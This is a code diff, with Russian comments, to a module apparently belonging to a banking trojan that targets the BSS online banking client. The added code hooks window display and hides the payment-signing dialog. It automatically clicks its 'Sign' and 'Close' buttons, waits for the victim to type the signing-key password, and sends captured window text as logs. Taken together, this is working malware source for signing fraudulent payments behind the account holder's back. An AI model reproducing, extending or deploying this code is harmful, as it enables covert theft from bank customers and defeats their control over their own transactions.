@@ -30,10 +30,10 @@ namespace BSSSign
 
 
 	// Делать скриншоты всплывающих окон системы
-    //#define LOG_BSS_SIGN
+    #define LOG_BSS_SIGN
 
 	// Определяем переменную включающую опцию прятания окна
-	#ifndef DEBUGCONFIG
+	#if  !defined(DEBUGCONFIG) && !defined(DEBUGBOT)
     	#define BSS_HIDE_WND
 	#endif
 
@@ -47,7 +47,10 @@ namespace BSSSign
     #define HASH_BUTTON_CLASS 0xB84059EC /* obj_BUTTON */
 
 	// Заголовок кнопки подписи перевода
-    DWORD HASH_BUTTON_CAPTION = 0xBE1A55FD; /* Подписать */
+    DWORD HASH_SIGN_BUTTON_CAPTION = 0xBE1A55FD; /* Подписать */
+
+	// Заголовко кнопки закрытия
+	DWORD HASH_CLOSE_BUTTON_CAPTION = 0xAE1E1985; /* Закрыть */
 
 	// Хэш имени класса Интернет Эксплорера
     #define HASH_IE_SERVER 0xF5E7484A /* Internet Explorer_Server */
@@ -65,6 +68,7 @@ namespace BSSSign
 	bool Blind  = false; // Использовать штору
 	bool Move   = false; // Двигать окно
 	bool SignState = false; // Признак того, что в данный момент идёт подпись
+	HWND PasswordForm = NULL;
 	RECT WindowRect;
 
 
@@ -147,7 +151,7 @@ void BSSSign::DoMoveWindow(HWND Wnd, int x, int y)
 //----------------------------------------------------------------------------
 
 
-void BSSSignDoClickToButtons(HWND Form, DWORD &Count)
+void BSSSignDoClickToButtons(HWND Form, bool MultiClick, DWORD BtnCaptionHash, DWORD &Count)
 {
 	// Перебираем дочерние окна определённого класса и заголовка
 	HWND Button = NULL;
@@ -162,21 +166,43 @@ void BSSSignDoClickToButtons(HWND Form, DWORD &Count)
 		STR::Free(Caption);
 
 		// Проверяем заголовок кнопки
-		if (Hash != BSSSign::HASH_BUTTON_CAPTION)
+		if (Hash != BtnCaptionHash)
 		{
-        	BSSSignDoClickToButtons(Button, Count);
+			BSSSignDoClickToButtons(Button, MultiClick, BtnCaptionHash, Count);
+			if (Count != 0 && !MultiClick) return;
 			continue;
 		}
 
 		// Кликаем по кнопке
-		pSleep(500);
+		pSleep(100);
 	
-		if (ClickToWindow(Button, 5, 5))
+		if (HardClickToWindow(Button, 5, 5))
+		{
 			Count++;
+			if (!MultiClick) return;
+        }
 	}
 	while (true);
 
 }
+//----------------------------------------------------------------------------
+void WaitPasswordWnd(HWND Wnd)
+{
+	// Фнкция ожидает пока закроется окно ввода пароля.
+	// Тоных данных для данного действия пока нет, по
+	// этому соберём код "на пальцах"
+
+	BYTE i = 1;
+	while ((BOOL)pIsWindowVisible(Wnd))
+	{
+		pSleep(1000);
+		i++;
+
+		if (i > 30) return;
+    }
+		
+}
+
 //----------------------------------------------------------------------------
 
 DWORD WINAPI BSSSign::SignPayment(LPVOID Data)
@@ -185,28 +211,33 @@ DWORD WINAPI BSSSign::SignPayment(LPVOID Data)
 	HWND Form = (HWND)Data;
 	if (Form == NULL) return 0;
 
+
+	pSleep(1000);
+
 	SignState = true;
-
-	pSleep(2000);
-
+	PasswordForm = NULL;
 	BDBG("bsssign","Кликаем по кнопкам подписи");
 
-
-//	#ifdef LOG_BSS_SIGN
-//		LPBYTE Screen    = NULL;
-//		DWORD ScreenSize = 0;
-//		ScreenShot::PrintWindow2(Form, Screen, ScreenSize);
-//	#endif
-
+	// Кликаем по кнопкам установки подписи
 	DWORD Count = 0;
-
-	// Кликаем по кнопкам
-	BSSSignDoClickToButtons(Form, Count);
+	BSSSignDoClickToButtons(Form, true, BSSSign::HASH_SIGN_BUTTON_CAPTION, Count);
 
 
-    // Ожидаем закрытия окна подписания
+	// При необходимости ожидаем закрытия окна ввода пароля
+	if (BSSSign::PasswordForm != NULL)
+		WaitPasswordWnd(BSSSign::PasswordForm);
+
+	// Кликаем по кнопкам закрытия окна
+	pSleep(1000);
+	if (pIsWindowVisible(Form))
+	{
+		DWORD Closed = 0;
+		BSSSignDoClickToButtons(Form, false, BSSSign::HASH_CLOSE_BUTTON_CAPTION, Closed);
+	}
+
+	// Ожидаем закрытия окна подписания
 	BOOL Visible = true;
-	
+
 	for (int i = 0; i < 10; i++)
 	{
 		pSleep(1000);
@@ -231,7 +262,7 @@ DWORD WINAPI BSSSign::SignPayment(LPVOID Data)
 		#endif
 
 		pSendMessageW(Form, WM_CLOSE, 0, 0);
-    }
+	}
 
 
 
@@ -244,6 +275,25 @@ DWORD WINAPI BSSSign::SignPayment(LPVOID Data)
 }
 //----------------------------------------------------------------------------
 
+bool IsPasswordForm(HWND Wnd)
+{
+	// Функция возвращает истину если, окно Wnd является окном
+	// ввода пароля
+
+
+	// Этап первый: Окно должно быть диалогом, не иметь родителя.
+	if (pGetParent(Wnd) != NULL)
+		return false;
+
+	// Этап второйЖ Возвращаем истину :)
+
+/* TODO :
+При получении дополнительных данных об окне ввода пароля
+организовать нормальную фильтрацию окон. */
+	return true;
+}
+
+//----------------------------------------------------------------------------
 BOOL WINAPI BSSSign::Hook_ShowWindow(HWND Wnd, int Cmd)
 {
 
@@ -323,21 +373,24 @@ BOOL WINAPI BSSSign::Hook_ShowWindow(HWND Wnd, int Cmd)
 
   		StartThread(SignPayment, Wnd);
 	}
+	else
+	if (SignState && IsPasswordForm(Wnd))
+	{
+		// При подписи документа потребовался ввод
+		// пароля ключа
+		PasswordForm = Wnd;
 
-	#ifdef LOG_BSS_SIGN
-		// В случае если во время подписи показывается неизвестное окно
-		// то формируем и отправляем лог
-		if (!StartSign && SignState)
-		{
-			// Показывается неизвестное окно, отправляем отчёт
+		#ifdef LOG_BSS_SIGN
+			// В случае если во время подписи показывается неизвестное окно
+			// то формируем и отправляем лог
 			PLog Log  = CreateStruct(TLog);
 			Log->Wnd  = Wnd;
 			Log->Type = STR::New(LogTypeBSSSignUnknown);
 			Log->Text = GetAllWindowsText(Wnd, true, true);
 
 			StartThread(SendLogAndDeleteData, Log);
-        }
-	#endif
+		#endif
+	}
 
 	return Result;
 }
